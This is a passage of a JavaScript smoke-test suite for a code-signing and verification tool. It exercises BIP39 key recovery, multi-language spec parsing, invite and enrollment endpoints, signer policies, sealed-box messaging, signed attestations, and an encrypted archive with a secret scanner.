  const erSpec = '//∷YAY⟨C-R⟩\n//  unit: paint\n//  intent: blue then red\n//  in: ctx, h:number\n//  pure: no\n//  records: ctx\n//  ensures: sets("fillStyle")[0] === "#00f" && sets("fillStyle").includes("#f00")\n//∷YAY-END⟨C-R⟩\n';
  const erChat = async () => '[[{},300]]';
  fs.writeFileSync(require('path').join(advDir, 'r.js'), erSpec + 'function paint(ctx,h){ctx.fillStyle="#00f";ctx.fillRect(0,0,9,h/3);ctx.fillStyle="#f00";ctx.fillRect(0,h/3,9,h);}\n');
  ok((await A.adversaryManifest(buildManifest(advDir), { provider: 'x' }, { chat: erChat }))['C-R'].status === 'survived', 'adversary(effects): correct effect order survives (recorded trace)');
  fs.writeFileSync(require('path').join(advDir, 'r.js'), erSpec + 'function paint(ctx,h){ctx.fillStyle="#f00";ctx.fillRect(0,0,9,h/3);ctx.fillStyle="#00f";ctx.fillRect(0,h/3,9,h);}\n');
  const erBad = (await A.adversaryManifest(buildManifest(advDir), { provider: 'x' }, { chat: erChat }))['C-R'];
  ok(erBad.status === 'broke' && /ensures failed/.test(erBad.counterexample), 'adversary(effects): inverted effect order BROKE via the recorded trace (the render-bug class)');
  fs.rmSync(advDir, { recursive: true, force: true });

  // recovery: BIP39 mnemonic → ed25519 key (the phone's key-backup layer), roster-compatible.
  const R = require('../src/vendor/recovery');
  const hx = (b) => Buffer.from(b).toString('hex');
  const z16 = new Uint8Array(16);
  ok(R.entropyToMnemonic(z16) === 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about', 'recovery: entropyToMnemonic matches the official BIP39 vector');
  ok(hx(R.mnemonicToSeed(R.entropyToMnemonic(z16), 'TREZOR')) === 'c55257c360c07c72029aebc1b53c05ed0362ada38ead3e3e9efa3708e53495531f09a6987599d18264c1e1c92f2cf141630c7a3c4ab7c81b2f001698e7463b04', 'recovery: PBKDF2-HMAC-SHA512 seed matches the official vector');
  const ent = new Uint8Array(32); for (let i = 0; i < 32; i++) ent[i] = (i * 37 + 11) & 0xff;
  const phrase = R.entropyToMnemonic(ent);
  ok(hx(R.mnemonicToEntropy(phrase)) === hx(ent), 'recovery: a 24-word phrase round-trips its entropy (checksum ok)');
  let mtamper = false; try { const w = phrase.split(' '); w[3] = 'zoo'; R.mnemonicToEntropy(w.join(' ')); } catch (_) { mtamper = true; }
  ok(mtamper, 'recovery: a wrong word fails the checksum');
  const rk1 = R.mnemonicToKeypair(phrase), rk2 = R.mnemonicToKeypair(phrase);
  ok(rk1.pub === rk2.pub && rk1.sec === rk2.sec, 'recovery: same phrase restores the identical keypair (device loss → same identity)');
  const rsig = require('../src/vendor/tweetnacl.min.js').sign.detached(new TextEncoder().encode('m'), Buffer.from(rk1.sec, 'base64'));
  ok(C.verify('m', Buffer.from(rsig).toString('base64'), rk1.pub), 'recovery: a mnemonic-derived signature verifies via crypto.js (enrollable in the roster)');

  // PIN-encrypted keystore: only ciphertext is stored; right PIN restores, wrong PIN fails.
  const blob = R.sealSecret(rk1.sec, 'correct horse battery', 2000);
  ok(!JSON.stringify(blob).includes(rk1.sec) && blob.ct && blob.nonce && blob.salt, 'keystore: sealed blob holds ciphertext, not the plaintext key');
  ok(R.openSecret(blob, 'correct horse battery') === rk1.sec, 'keystore: the right PIN unlocks the exact secret');
  ok(R.openSecret(blob, 'wrong pin here') === null, 'keystore: a wrong PIN returns null (no key leaked)');

  // 13) multi-language support (Tier A/B): Python, C#, Solidity, Rust — spec blocks
  // extract, unit bodies are found, signing works and the gate colours honestly:
  // signed-but-unproven → YELLOW (never a false GREEN), un-specced code → PINK,
  // and control-flow/keywords never produce a FALSE Pink.
  {
    const langDir = path.join(__dirname, 'fixtures', 'langs');
    const lm = buildManifest(langDir);
    const specced = { 'PY-1': 'add', 'CS-1': 'Add', 'SOL-1': 'deposit', 'RS-1': 'add', 'GO-1': 'Add', 'JAVA-1': 'add', 'RB-1': 'add' };
    const ids = Object.keys(specced);
    for (const id of ids) ok(lm.cells[id], `lang: extracts ${id} spec block`);
    ok(lm.cells['PY-1'].unitFound && lm.cells['PY-1'].unitName === 'add', 'lang(py): finds the def body by indentation');
    ok(lm.cells['CS-1'].unitFound && lm.cells['CS-1'].unitName === 'Add', 'lang(cs): finds the method body by braces');
    ok(lm.cells['SOL-1'].unitFound && lm.cells['SOL-1'].unitName === 'deposit', 'lang(sol): finds the function body');
    ok(lm.cells['RS-1'].unitFound && lm.cells['RS-1'].unitName === 'add', 'lang(rs): finds the fn body');
    ok(lm.cells['GO-1'].unitFound && lm.cells['GO-1'].unitName === 'Add', 'lang(go): finds the func body');
    ok(lm.cells['JAVA-1'].unitFound && lm.cells['JAVA-1'].unitName === 'add', 'lang(java): finds the method body');
    ok(lm.cells['RB-1'].unitFound && lm.cells['RB-1'].unitName === 'add', 'lang(rb): finds the def…end body');

    const lapp = { id: 'A-LANG', project: 'langs', prev: 'genesis', nonce: 'n', at: 't', signer: 'tester', items: {} };
    for (const id of ids) lapp.items[id] = lm.cells[id].specHash;
    lapp.signature = C.sign(canonical(lapp), privDer);
    const lv = verifyManifest(lm, { approvals: [lapp] }, { signers: { tester: pubB64 } });

    for (const id of ids) ok(lv.results[id].state === 'YELLOW', `lang: signed ${id} is YELLOW (signed-only, no false-green)`);
    ok(lv.counts.GREEN === 0, 'lang: no non-JS Cell reaches GREEN (honest cap)');
    ok(lv.counts.RED === 0, 'lang: no false RED on valid non-JS code');

    const pinks = Object.values(lv.results).filter((r) => r.state === 'PINK');
    const pinkNames = pinks.map((r) => r.name);
    ok(pinkNames.filter((x) => x.toLowerCase() === 'undocumented').length === 7, 'lang: every un-specced unit across all 7 languages → PINK');
    ok(pinkNames.includes('Undocumented'), 'lang(cs): case preserved in the reported name');
    ok(pinks.length === 7, `lang: exactly 7 PINK units — no false Pink from control flow/class/pragma/package (got ${pinks.length}: ${pinkNames.join(', ')})`);

    // comment-agnostic field parsing: spec fields work with any comment lead, not just // and #
    const { parseSpec } = require('../src/extract');
    const sql = parseSpec(['-- ∷YAY⟨X⟩', '--  unit: foo', '--  intent: does a thing', '-- ∷YAY-END⟨X⟩']);
    ok(sql.unit === 'foo' && /does a thing/.test(sql.intent), 'parseSpec: SQL/Lua/Haskell -- comment leads parse');
    const misc = parseSpec(['; unit: bar', '% intent: erlang or matlab style', '(* out: number *)']);
    ok(misc.unit === 'bar' && misc.out === 'number' && /erlang/.test(misc.intent), 'parseSpec: ; % and (* *) comment leads parse');
  }

  // 14) yay adopt on non-JS: correct comment lead per language, skips specced units.
  {
    const { adopt } = require('../src/adopt');
    // Python → '#' lead, and the already-specced `add` is not re-adopted.
    const apy = fs.mkdtempSync(path.join(os.tmpdir(), 'yay-adopt-py-'));
    fs.copyFileSync(path.join(__dirname, 'fixtures', 'langs', 'sample.py'), path.join(apy, 's.py'));
    const rpy = adopt(apy, { dry: false });
    const py = fs.readFileSync(path.join(apy, 's.py'), 'utf8');
    ok(rpy.total === 1, 'adopt(py): drafts exactly one block (undocumented), skips the specced add');
    ok(/#∷YAY⟨/.test(py) && !/\/\/∷YAY⟨/.test(py), 'adopt(py): uses # comment lead (valid Python), never //');
    const apm = buildManifest(apy);
    ok(Object.values(apm.cells).some((c) => c.unitName === 'undocumented'), 'adopt(py): drafted block governs undocumented on re-scan');
    fs.rmSync(apy, { recursive: true, force: true });

    // Rust → '//' lead, drafts the un-specced fn.
    const ars = fs.mkdtempSync(path.join(os.tmpdir(), 'yay-adopt-rs-'));
    fs.copyFileSync(path.join(__dirname, 'fixtures', 'langs', 'sample.rs'), path.join(ars, 's.rs'));
    const rrs = adopt(ars, { dry: false });
    const rs = fs.readFileSync(path.join(ars, 's.rs'), 'utf8');
    ok(rrs.total === 1 && /\/\/∷YAY⟨/.test(rs), 'adopt(rs): drafts the un-specced fn with // lead');
    fs.rmSync(ars, { recursive: true, force: true });
  }

  // 15) teammate invite → join → enroll (the dashboard invite endpoints end-to-end).
  {
    const { startDashboard } = require('../src/dashboard');
    const enrollCalls = [];
    const s = await startDashboard({
      project: 'testproj',
      enroll: (a) => { enrollCalls.push(a); return Promise.resolve({ ok: true, output: 'enrolled ' + a.name }); },
      buildMapHTML: () => ({ html: '<html></html>' }),
      version: () => 'v1',
    }, { port: 0 });
    const base = 'http://127.0.0.1:' + s.port;
    const jget = (u) => fetch(base + u).then((r) => r.json());
    const jpost = (u, body) => fetch(base + u, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then(async (r) => ({ status: r.status, body: await r.json() }));

    const created = await jpost('/api/invite/create', { name: 'Bob', role: 'signer' });
    ok(created.body.ok && created.body.token && created.body.joinPath === '/join?t=' + created.body.token, 'invite: owner mints a token');
    const token = created.body.token;
    const info = await jget('/api/invite/info?t=' + token);
    ok(info.valid && info.name === 'Bob' && info.role === 'signer' && info.project === 'testproj', 'invite: /info reports name, role, project');

    const kp = C.generateKeypair();
    const proof = C.sign(token, kp.privDer); // prove possession by signing the token
    // The joiner EDITS the suggested name ("Bob") to their own before submitting.
    const joined = await jpost('/api/invite/join', { token, name: 'Bob the Builder', pubB64: kp.pubB64, proof });
    const expectCode = String(parseInt(C.sha256('yay-pair:' + kp.pubB64).slice(0, 8), 16) % 1000000).padStart(6, '0');
    ok(joined.body.ok && joined.body.code === expectCode, 'invite: valid join returns the 6-digit confirm code');
    ok(enrollCalls.length === 1 && enrollCalls[0].pubkey === kp.pubB64 && enrollCalls[0].role === 'signer', 'invite: join triggers the owner-signed enroll with the joiner’s pubkey');
    ok(enrollCalls[0].name === 'Bob the Builder', 'invite: the joiner’s edited name (not the invite suggestion) becomes the roster label');

    // the enroll mock resolves ok → status flips to done+ok
    let st = null; for (let i = 0; i < 20 && !(st && st.done); i++) { st = await jget('/api/invite/status?t=' + token); if (!st.done) await new Promise((r) => setTimeout(r, 25)); }
    ok(st && st.done && st.result && st.result.ok, 'invite: status reports the enroll result once approved');

    // one-time: the same token can’t be reused
    const reuse = await jpost('/api/invite/join', { token, name: 'Bob', pubB64: kp.pubB64, proof });
    ok(reuse.status === 409, 'invite: a used token is rejected (one-time)');

    // bad proof: a join whose proof doesn’t match the pubkey is rejected
    const c2 = await jpost('/api/invite/create', { name: 'Eve', role: 'signer' });
    const kp2 = C.generateKeypair();
    const badProof = C.sign('not-the-token', kp2.privDer);
    const bad = await jpost('/api/invite/join', { token: c2.body.token, name: 'Eve', pubB64: kp2.pubB64, proof: badProof });
    ok(bad.status === 400 && /possession/.test(bad.body.error || ''), 'invite: a bad possession proof is rejected');

    // expired / unknown token → invalid
    const gone = await jget('/api/invite/info?t=deadbeef');
    ok(gone.valid === false, 'invite: an unknown token is invalid');

    s.close();
  }

  // 16) signing policy — neutral by default; a rule requires a specific signer, gate-enforced.
  {
    const { requiredSigners } = require('../src/policy');
    const pmani = buildManifest(path.join(__dirname, '..', 'examples'));
    const pkp = C.generateKeypair();
    const papp = { id: 'A-P', project: 'test', prev: 'genesis', nonce: 'n', at: 't', signer: 'tester', items: { 'C-040': pmani.cells['C-040'].specHash } };
    papp.signature = C.sign(canonical(papp), pkp.privDer);
    const pconfig = { signers: { tester: pkp.pubB64 } };
    const c040 = pmani.cells['C-040'];

    ok(requiredSigners({ rules: [] }, c040).length === 0, 'policy: no rules → unconstrained (neutral)');
    const pol = { rules: [{ match: { path: '**/calcPortfolioValue.js' }, signer: 'Sara Olsen' }, { match: { tag: 'security' }, signer: 'Sara Olsen' }] };
    ok(requiredSigners(pol, c040).length === 1 && requiredSigners(pol, c040)[0] === 'Sara Olsen', 'policy: path glob matches the Cell → requires Sara');

    // neutral default: C-040 (signed by "tester") is GREEN
    const vNeutral = verifyManifest(pmani, { approvals: [papp] }, pconfig, {});
    ok(vNeutral.results['C-040'].state === 'GREEN', 'policy: neutral default → C-040 GREEN (unchanged)');
    // wrong signer → blocked (RED)
    const vBad = verifyManifest(pmani, { approvals: [papp] }, pconfig, { policy: pol });
    ok(vBad.results['C-040'].state === 'RED' && vBad.results['C-040'].policyOk === false, 'policy: a Cell signed by the wrong person is blocked (RED)');
    ok(vBad.counts.policyBlocked >= 1 && !vBad.passed, 'policy: violation is counted and fails the gate');
    ok(/requires Sara Olsen to sign/.test((vBad.results['C-040'].notes.find((x) => /^policy:/.test(x.text)) || {}).text || ''), 'policy: the note names the required signer');
    // required signer signed → satisfied (GREEN)
    const vOk = verifyManifest(pmani, { approvals: [papp] }, pconfig, { policy: { rules: [{ match: { path: '**/calcPortfolioValue.js' }, signer: 'tester' }] } });
    ok(vOk.results['C-040'].state === 'GREEN' && vOk.results['C-040'].policyOk === true, 'policy: the required signer signed → satisfied (GREEN)');

    // tamper-evident: the ENFORCED policy is owner-signed in the roster log.
    const R = require('../src/roster');
    const gen = { id: 'R-0001', type: 'genesis', name: 'tester', pub: pkp.pubB64, role: 'owner', by: 'tester', prev: 'genesis', nonce: 'g', at: 't' };
    gen.signature = C.sign(R.eventBytes(gen), pkp.privDer);
    const pev = { id: 'R-0002', type: 'policy', rules: [{ match: { path: '**/calcPortfolioValue.js' }, signer: 'Sara Olsen' }], by: 'tester', prev: 'R-0001', nonce: 'pn', at: 't' };
    pev.signature = C.sign(R.eventBytes(pev), pkp.privDer);
    const rlog = { events: [gen, pev] };
    const drv = R.deriveRoster(rlog);
    ok(drv.ok && drv.policy.rules.length === 1 && drv.policy.rules[0].signer === 'Sara Olsen', 'policy(roster): an owner-signed policy event derives the rules');
    // enforced straight from the signed roster (no opts.policy override)
    const vRoster = verifyManifest(pmani, { approvals: [papp] }, pconfig, { roster: rlog });
    ok(vRoster.results['C-040'].state === 'RED' && vRoster.results['C-040'].policyOk === false, 'policy(roster): the signed policy is enforced from the roster (wrong signer → RED)');
    // tamper: strip the rule but keep the old signature → the event is rejected, roster invalid
    const drvTampered = R.deriveRoster({ events: [gen, { ...pev, rules: [] }] });
    ok(!drvTampered.ok, 'policy(roster): editing the rules without re-signing invalidates the roster (tamper-evident)');
  }

  // 17) inbox crypto foundation — Ed25519↔X25519 sealed box (signer-router step 1).
  {
    const E2 = require('../src/e2e');
    const R = require('../src/vendor/recovery.js');
    const nacl = require('../src/vendor/tweetnacl.min.js');
    const kp = R.mnemonicToKeypair(R.newMnemonic(new Uint8Array(require('crypto').randomBytes(32))));
    const msg = { approval: 'A-1', secret: true };
    const sealed = E2.sealTo(kp.pub, msg);
    ok(JSON.stringify(E2.openSealed(kp.sec, sealed)) === JSON.stringify(msg), 'inbox: laptop seals → laptop opens (round-trip)');
    ok(JSON.stringify(R.openSealed(kp.sec, sealed)) === JSON.stringify(msg), 'inbox: laptop seals → phone (recovery.js) opens (cross-side)');
    const kp2 = R.mnemonicToKeypair(R.newMnemonic(new Uint8Array(require('crypto').randomBytes(32))));
    ok(E2.openSealed(kp2.sec, sealed) === null && R.openSealed(kp2.sec, sealed) === null, 'inbox: a different key cannot open the sealed request');
    ok(E2.inboxChannel(kp.pub) === R.inboxChannel(kp.pub) && /^[A-Za-z0-9_-]{24}$/.test(E2.inboxChannel(kp.pub)), 'inbox: laptop & phone derive the same url-safe inbox channel');
    const secB = new Uint8Array(Buffer.from(kp.sec, 'base64'));
    const pubRaw = ((u) => u.subarray(u.length - 32))(new Uint8Array(Buffer.from(kp.pub, 'base64')));
    ok(Buffer.from(nacl.scalarMult.base(E2.edSecToX(secB))).toString('hex') === Buffer.from(E2.edPubToX(pubRaw)).toString('hex'), 'inbox: X25519 pub from the secret == from the ed25519 pub (conversion is consistent)');
  }

  // 18) router reply round-trip (signer-router step 3) — the sender seals a request WITH a
  // symmetric replyKey to the target's inbox; the target opens it, seals a reply with that
  // key, and only the original sender can read the reply back. Relay sees opaque blobs.
  {
    const E2 = require('../src/e2e');
    const R = require('../src/vendor/recovery.js');
    const sara = R.mnemonicToKeypair(R.newMnemonic(new Uint8Array(require('crypto').randomBytes(32))));
    const replyKey = E2.b64url(E2.newKey());
    // Sender (Lisa's machine) → Sara's inbox
    const wire = { mode: 'approve', approval: { id: 'A-9', items: {} }, replyKey, signer: 'Sara' };
    const sealed = E2.sealTo(sara.pub, wire);
    // Sara's phone opens it and recovers the same replyKey
    const got = R.openSealed(sara.sec, sealed);
    ok(got && got.replyKey === replyKey, 'router: the target opens the sealed request and recovers the replyKey');
    // Sara seals her reply with that key; the sender opens it with the key it kept
    const reply = E2.seal(E2.fromB64url(got.replyKey), { signature: 'SIG-abc' });
    const back = E2.open(E2.fromB64url(replyKey), reply);
    ok(back && back.signature === 'SIG-abc', 'router: the sender opens the reply with its replyKey (round-trip)');
    // an eavesdropper with a different key learns nothing from the reply
    ok(E2.open(E2.newKey(), reply) === null, 'router: a wrong replyKey cannot read the reply');
    // a "send back" reply (no signature, optional note) round-trips the same way
    const sb = E2.seal(E2.fromB64url(got.replyKey), { rejected: true, reason: 'rate-limit signup too', tags: ['Security', 'API'] });
    const sbBack = E2.open(E2.fromB64url(replyKey), sb);
    ok(sbBack && sbBack.rejected === true && sbBack.reason === 'rate-limit signup too', 'router: a send-back (rejected + note) round-trips to the requester');
    ok(sbBack && Array.isArray(sbBack.tags) && sbBack.tags.join(',') === 'Security,API', 'router: corrected tags ride back in the send-back');
  }

  // 19) Brief tags — pool vocabulary + tags ride inside the signed Brief (tamper-evident).
  {
    const T = require('../src/tags');
    ok(T.TAG_SETS.length === 6 && new Set(T.TAG_SETS.map((s) => s.id)).size === 6, 'tags: six distinct starter sets');
    ok(Array.isArray(T.CUSTOM_SEED) && T.CUSTOM_SEED.length === 4, 'tags: custom seed has 4 placeholders to relabel');
    ok(T.TAG_SETS.every((s) => Array.isArray(s.tags) && s.tags.length >= 8), 'tags: every set has a real tag list');
    const pool = T.setById('responsibility').tags;
    ok(JSON.stringify(T.parseTags(pool, 'ui, SECURITY')) === JSON.stringify(['UI', 'Security']), 'tags: parseTags canonicalizes case against the pool');
    ok(JSON.stringify(T.parseTags(pool, 'API, api, Api')) === JSON.stringify(['API']), 'tags: parseTags de-dupes case-insensitively');
    ok(JSON.stringify(T.unknownTags(pool, ['UI', 'Payments'])) === JSON.stringify(['Payments']), 'tags: unknownTags flags out-of-pool tags');
    // a Brief carries its tags, and the signature covers them → editing a tag breaks it
    const kp = C.generateKeypair();
    const appr = { id: 'A-1', project: 'x', nonce: 'n', at: 't', signer: 'z', items: { 'C-1': 'h' }, brief: { title: 'Login throttle', text: 'add login throttle', tags: ['Security', 'API'] } };
    const sig = C.sign(canonical(appr), kp.privDer); // sign the title+tag-bearing Brief
    ok(C.verify(canonical(appr), sig, kp.pubB64), 'tags: a titled+tagged Brief signs + verifies');
    const tampered = JSON.parse(JSON.stringify(appr)); tampered.brief.tags = ['UI'];
    ok(!C.verify(canonical(tampered), sig, kp.pubB64), 'tags: changing a tag after signing breaks the signature (tamper-evident)');
    const tt = JSON.parse(JSON.stringify(appr)); tt.brief.title = 'Something else';
    ok(!C.verify(canonical(tt), sig, kp.pubB64), 'brief: changing the title after signing breaks the signature (tamper-evident)');
  }

  // 20) P2 — verifier attestation (the third crypto identity: the verifier signs its own verdict).
  {
    const A = require('../src/attest');
    const os = require('os'), fs = require('fs');
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'yay-attest-'));
    const p = { root: tmp, yay: path.join(tmp, '.yaylayer'), keys: path.join(tmp, '.yaylayer', 'keys') };
    const config = { project: 'attx' };
    const manifest = { cells: {
      'C-1': { specHash: 'aaa', unitBody: 'function f(){return 1}' },
      'C-2': { specHash: 'bbb', unitBody: 'function g(){return 2}' },
      'M-1': { contains: ['C-1', 'C-2'], specHash: 'm' },
    } };
    const verified = { results: { 'C-1': { state: 'GREEN', proven: true }, 'C-2': { state: 'GREEN', proven: false } }, counts: { GREEN: 2, proven: 1 }, passed: true, rootFp: 'fp:1', policy: { rules: [] } };

    const id = A.verifierIdentity(p, config);
    ok(fs.existsSync(A.verifierKeyPath(p)), 'attest: verifier key created machine-side (in gitignored keys/)');
    const changed = A.pinVerifier(config, id);
    ok(changed && config.verifier && config.verifier.pub === id.pub, 'attest: pinVerifier records the public verifier of record in config');

    const v = A.buildVerification(manifest, verified, { config, policy: verified.policy });
    ok(v.cells === 2 && v.capability === A.CAPABILITY, 'attest: verification object counts leaf Cells + records the capability version');
    ok(v.codeTreeHash === A.codeTreeHashOf(manifest), 'attest: codeTreeHashOf(manifest) matches the verification object (cheap coverage check)');
    ok(v.result.passed === true && v.result.counts.GREEN === 2, 'attest: verification object carries the gate result');

    const att = A.signAttestation(v, id);
    ok(A.verifyAttestation(att, id.pub).ok, 'attest: a freshly signed attestation verifies under its verifier key');

    // tamper: flip the result → hash no longer matches the core
    const bad = JSON.parse(JSON.stringify(att)); bad.result.passed = false;
    ok(!A.verifyAttestation(bad, id.pub).ok, 'attest: tampering with the verdict breaks the attestation (hash mismatch)');
    // wrong verifier of record
    const other = A.verifierIdentity({ root: path.join(tmp, 'o'), yay: path.join(tmp, 'o', '.yaylayer'), keys: path.join(tmp, 'o', '.yaylayer', 'keys') }, {});
    ok(!A.verifyAttestation(att, other.pub).ok, 'attest: an attestation from a different verifier is rejected against the pinned key');

    // append-only ledger + content-addressed load
    A.appendAttestation(p, config, att);
    const v2 = A.buildVerification(manifest, verified, { config, policy: verified.policy, at: '2030-01-01T00:00:00.000Z' });
    const att2 = A.signAttestation(v2, id);
    A.appendAttestation(p, config, att2);
    const led = A.loadLedger(p, config);
    ok(led.entries.length === 2 && led.entries[1].prev === led.entries[0].hash, 'attest: ledger is append-only + chained (each entry references the previous hash)');
    ok(!!A.loadAttestation(p, config, att.hash), 'attest: stored attestation loads back + re-validates by hash');
    // a tampered stored object is refused on load
    fs.writeFileSync(A.attFile(p, att.hash), fs.readFileSync(A.attFile(p, att.hash), 'utf8').replace('"passed": true', '"passed": false'));
    ok(A.loadAttestation(p, config, att.hash) === null, 'attest: a tampered stored attestation is refused on load');

    fs.rmSync(tmp, { recursive: true, force: true });
  }

  // 21) P4 — long-lived assurance: reverify diff, integrity witness, earned-autonomy metrics.
  {
    const AS = require('../src/assurance');
    // reverify diff: Yellow→Green is an improvement; Green→Red a regression; capability change flagged.
    const prev = { capability: '1.0.0', evidence: { 'C-1': { state: 'YELLOW', proven: false }, 'C-2': { state: 'GREEN', proven: true }, 'C-3': { state: 'GREEN', proven: true } } };
    const now = { capability: '1.1.0', evidence: { 'C-1': { state: 'GREEN', proven: true }, 'C-2': { state: 'RED', proven: false }, 'C-3': { state: 'GREEN', proven: true } } };
    const d = AS.reverifyDiff(prev, now);
    ok(d.capabilityChanged === true && d.fromCapability === '1.0.0' && d.toCapability === '1.1.0', 'p4-reverify: a capability change is flagged with from/to');
    ok(d.improved === 1 && d.regressed === 1 && d.changes.length === 2, 'p4-reverify: counts improvements (Y→G) and regressions (G→R); unchanged Cells are omitted');
    ok(AS.reverifyDiff(prev, prev).changes.length === 0, 'p4-reverify: identical evidence yields no changes (nothing to append)');

    // integrity witness: sound when the chain validates, latest covers the tree, and specs are archived.
    const ledger = { entries: [{ hash: 'h1', prev: 'genesis', codeTreeHash: 'TREE' }, { hash: 'h2', prev: 'h1', codeTreeHash: 'TREE' }] };
    const good = AS.integrityWitness({ ledger, loadAttestation: () => ({ ok: true }), currentCodeTreeHash: 'TREE', approvals: [{ items: { 'C-1': 'sh1' } }], hasSpecObject: () => true });
    ok(good.ok === true && good.checks.chainOk && good.checks.latestCovered && good.checks.specsMissing === 0, 'p4-witness: sound when chain + coverage + spec-archive all hold');
    const brokenChain = AS.integrityWitness({ ledger: { entries: [{ hash: 'h1', prev: 'genesis' }, { hash: 'h2', prev: 'WRONG' }] }, loadAttestation: () => ({}), currentCodeTreeHash: null, approvals: [] });
    ok(brokenChain.ok === false && brokenChain.checks.chainOk === false, 'p4-witness: a broken attestation chain is caught');
    const drift = AS.integrityWitness({ ledger, loadAttestation: () => ({}), currentCodeTreeHash: 'DIFFERENT', approvals: [], hasSpecObject: () => true });
    ok(drift.ok === false && drift.checks.latestCovered === false, 'p4-witness: code drift (latest attestation no longer covers the tree) is caught');
    const missSpec = AS.integrityWitness({ ledger, loadAttestation: () => ({}), currentCodeTreeHash: 'TREE', approvals: [{ items: { 'C-1': 'sh1' } }], hasSpecObject: () => false });
    ok(missSpec.checks.specsMissing === 1 && missSpec.ok === false, 'p4-witness: a signed spec revision missing from the archive is caught');
    const tampered = AS.integrityWitness({ ledger, loadAttestation: () => null, currentCodeTreeHash: 'TREE', approvals: [], hasSpecObject: () => true });
    ok(tampered.ok === false && tampered.checks.attestationsValidated === 0, 'p4-witness: an attestation object that fails its integrity check is caught');

    // earned-autonomy: delegated/ratified/rejected + by-category + a suggestion at ≥3 rejections.
    const approvals = [
      { autoApproved: true, items: { 'C-1': 'a', 'C-2': 'b' } },
      { items: { 'C-1': 'a' } }, // human ratification of C-1
    ];
    const rejections = { events: [
      { type: 'reject', category: 'dependency', cells: ['C-2'] },
      { type: 'reject', category: 'dependency', cells: ['C-5', 'C-6'] },
    ] };
    const m = AS.earnedAutonomy(rejections, approvals);
    ok(m.delegated === 2 && m.ratified === 1, 'p4-metrics: counts delegated Cells and ratified (delegated-then-human-signed) Cells');
    ok(m.rejected === 3 && m.byCategory.dependency === 3, 'p4-metrics: counts rejected Cells and groups them by category');
    ok(m.suggestions.length === 1 && /dependency/.test(m.suggestions[0]), 'p4-metrics: suggests excluding a category rejected ≥3×');
  }

  // 22) P4 — Durable mode: encrypted, sha256-anchored archive; secret scan; honest tombstones.
  {
    const D = require('../src/durable');
    const os = require('os'), fs = require('fs');
    const tmp = fs.mkdtempSync(require('path').join(os.tmpdir(), 'yay-durable-'));
    const p = { root: tmp, yay: require('path').join(tmp, '.yaylayer'), keys: require('path').join(tmp, '.yaylayer', 'keys') };
    const key = D.resolveKey('archive-pass-123', 'salt-1');
    ok(Buffer.isBuffer(key) && key.length === 32, 'p4-durable: resolveKey derives a 32-byte key from a passphrase');
    // encrypt/decrypt roundtrip
    const src = 'function add(a,b){ return a+b; } // signed source';
    const put = D.putBlob(p, src, key);
    ok(put.hash === C.sha256(src), 'p4-durable: a blob is anchored by the sha256 of its PLAINTEXT (our trust anchor, not git SHA-1)');
    ok(D.getBlob(p, put.hash, key) === src, 'p4-durable: getBlob decrypts back to the exact source (AES-256-GCM roundtrip)');
    // wrong key fails (confidentiality)
    let wrong = false; try { D.getBlob(p, put.hash, D.resolveKey('other-pass', 'salt-1')); } catch (_) { wrong = true; }
    ok(wrong, 'p4-durable: a wrong archive key cannot decrypt the blob');
    // dedup: same content → same anchor, write-once
    ok(D.putBlob(p, src, key).existed === true, 'p4-durable: identical content is stored once (content-addressed dedup)');
    // tamper: corrupt the ciphertext file → anchor/auth check fails on read
    fs.writeFileSync(D.blobPath(p, put.hash), JSON.stringify(D.encryptBlob('DIFFERENT source', key)));
    let tamper = false; try { D.getBlob(p, put.hash, key); } catch (_) { tamper = true; }
    ok(tamper, 'p4-durable: a blob whose plaintext no longer matches its anchor is rejected (tamper-evident)');
    // secret scan
    ok(D.secretScan('const k = "AKIAIOSFODNN7EXAMPLE";').length >= 1, 'p4-durable: secret scan catches an AWS key');
    ok(D.secretScan('-----BEGIN RSA PRIVATE KEY-----').length === 1, 'p4-durable: secret scan catches a private key block');
    ok(D.secretScan('const total = a + b;').length === 0, 'p4-durable: secret scan does not false-positive on ordinary code');
    // tombstone = honest erasure (ciphertext gone, signed record remains)
    const ts = D.tombstone(p, put.hash, 'contained a secret', 'Alex');
    ok(ts.status === 'deliberately removed' && ts.reason === 'contained a secret' && ts.by === 'Alex', 'p4-durable: a tombstone records status/reason/who (never a silent delete)');
    ok(fs.existsSync(D.blobPath(p, put.hash)) === false, 'p4-durable: tombstoning deletes the ciphertext');
    fs.rmSync(tmp, { recursive: true, force: true });
  }

  console.log(`\nAll ${n} checks passed.`);
})().catch((e) => { console.error('smoke failed:', e); process.exit(1); });
